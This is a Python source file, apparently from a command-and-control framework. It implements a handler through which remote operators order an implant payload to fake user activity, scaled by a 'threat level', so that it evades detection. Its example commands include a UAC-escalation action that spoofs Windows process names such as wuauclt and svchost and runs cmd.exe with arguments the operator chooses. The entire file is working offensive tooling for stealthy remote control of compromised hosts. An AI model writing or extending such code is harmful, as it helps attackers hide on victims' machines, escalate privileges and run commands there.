"""
C2 Command Handler: User Activity Emulator

Integrates RemoteActivityPayload with C2 command infrastructure.
Allows remote operators to command behavioral noise generation.

Example C2 commands:
    {
        "command": "behavioral_noise",
        "action": "emit_activity",
        "threat_level": 75,
        "intention": "work"
    }
    
    {
        "command": "behavioral_noise",
        "action": "start_daemon",
        "threat_level": 60,
        "intention": "browse",
        "duration": 600
    }
    
    {
        "command": "behavioral_noise",
        "action": "uac_escalate",
        "process_spoof": "wuauclt",
        "args": "/c ipconfig"
    }
"""

import json
import logging
import asyncio
from typing import Dict, Any, Optional
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class BehavioralNoiseCommand:
    """C2 command for behavioral noise control"""
    action: str  # emit_activity, start_daemon, stop, uac_escalate, status
    threat_level: int = 50
    intention: str = "browse"
    duration: int = 0
    process_spoof: str = "svchost"
    exe_path: str = "C:\\Windows\\System32\\cmd.exe"
    args: str = ""


class BehavioralNoiseC2Handler:
    """
    C2 command handler for remote behavioral noise control.
    
    Integrates with threat_calibration for dynamic threat-driven behavior.
    """
    
    def __init__(self):
        self.payload = None
        self._initialize_payload()
    
    def _initialize_payload(self) -> bool:
        """Lazily load payload (avoid import errors if not available)"""
        if self.payload is not None:
            return True
        
        try:
            from payload_user_activity_remote import RemoteActivityPayload
            self.payload = RemoteActivityPayload()
            logger.info("[C2-BehavioralNoise] Handler initialized")
            return True
        except ImportError as e:
            logger.warning(f"[C2-BehavioralNoise] Payload not available: {e}")
            return False
    
    async def handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """
        Handle C2 behavioral noise command.
        
        Args:
            command: JSON command dict
        
        Returns:
            Response dict with status and results
        """
        if not self._initialize_payload():
            return {
                "status": "error",
                "message": "Behavioral noise payload not available"
            }
        
        try:
            action = command.get("action", "emit_activity")
            threat_level = command.get("threat_level", 50)
            intention = command.get("intention", "browse")
            duration = command.get("duration", 0)
            
            logger.info(f"[C2-BehavioralNoise] Command: action={action}, threat={threat_level}, intention={intention}")
            
            # Execute command asynchronously
            result = await asyncio.to_thread(
                self.payload.execute_from_config,  # type: ignore
                {
                    "action": action,
                    "threat_level": threat_level,
                    "intention": intention,
                    "duration": duration,
                    "process_spoof": command.get("process_spoof", "svchost"),
                    "exe_path": command.get("exe_path", "C:\\Windows\\System32\\cmd.exe"),
                    "args": command.get("args", "")
                }
            )
            
            logger.info(f"[C2-BehavioralNoise] Result: {result['status']}")
            return result
        
        except Exception as e:
            logger.error(f"[C2-BehavioralNoise] Command handling error: {e}")
            return {
                "status": "error",
                "message": str(e)
            }
    
    async def handle_threat_update(self, new_threat_level: int) -> Dict[str, Any]:
        """
        Update behavioral noise based on new threat level from threat_calibration.
        
        Called automatically when threat level changes.
        
        Args:
            new_threat_level: New threat score (0-100)
        
        Returns:
            Response dict
        """
        if not self._initialize_payload():
            return {"status": "error", "message": "Payload not available"}
        
        try:
            logger.info(f"[C2-BehavioralNoise] Threat update: {new_threat_level}/100")
            
            # Emit activity at new threat level
            result = await asyncio.to_thread(
                self.payload.execute_from_config,  # type: ignore
                {
                    "action": "emit_activity",
                    "threat_level": new_threat_level,
                    "intention": "default"
                }
            )
            
            return {
                "status": "updated",
                "threat_level": new_threat_level
            }
        
        except Exception as e:
            logger.error(f"[C2-BehavioralNoise] Threat update error: {e}")
            return {"status": "error", "message": str(e)}
    
    def get_status(self) -> Dict[str, Any]:
        """Get current behavioral noise status"""
        if not self._initialize_payload():
            return {"status": "error", "available": False}
        
        return {
            "status": "ok",
            "available": True,
            "payload_status": self.payload.get_status()  # type: ignore
        }


# Global handler instance
_global_handler: Optional[BehavioralNoiseC2Handler] = None


def get_behavioral_noise_handler() -> BehavioralNoiseC2Handler:
    """Get or create global C2 handler"""
    global _global_handler
    if _global_handler is None:
        _global_handler = BehavioralNoiseC2Handler()
    return _global_handler


# ============================================================================
# INTEGRATION WITH C2 COMMAND ROUTER
# ============================================================================

async def handle_behavioral_noise_command(request_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    C2 API endpoint for behavioral noise commands.
    
    Route: POST /api/command/behavioral_noise
    
    Example request:
    {
        "command": "behavioral_noise",
        "action": "start_daemon",
        "threat_level": 75,
        "intention": "work",
        "duration": 600
    }
    """
    handler = get_behavioral_noise_handler()
    return await handler.handle_command(request_data)


async def threat_update_handler(threat_level: int) -> Dict[str, Any]:
    """
    Called by threat_calibration when threat level changes.
    Automatically updates behavioral noise intensity.
    """
    handler = get_behavioral_noise_handler()
    return await handler.handle_threat_update(threat_level)


if __name__ == "__main__":
    import sys
    
    # Test the handler
    handler = BehavioralNoiseC2Handler()
    
    test_commands = [
        {"action": "status"},
        {"action": "emit_activity", "threat_level": 50, "intention": "browse"},
        {"action": "status"},
    ]
    
    print("[*] Testing C2 Behavioral Noise Handler\n")
    
    for i, cmd in enumerate(test_commands, 1):
        print(f"[Test {i}] Command: {cmd['action']}")
        result = asyncio.run(handler.handle_command(cmd))
        print(f"[Test {i}] Result: {json.dumps(result, indent=2, default=str)}\n")
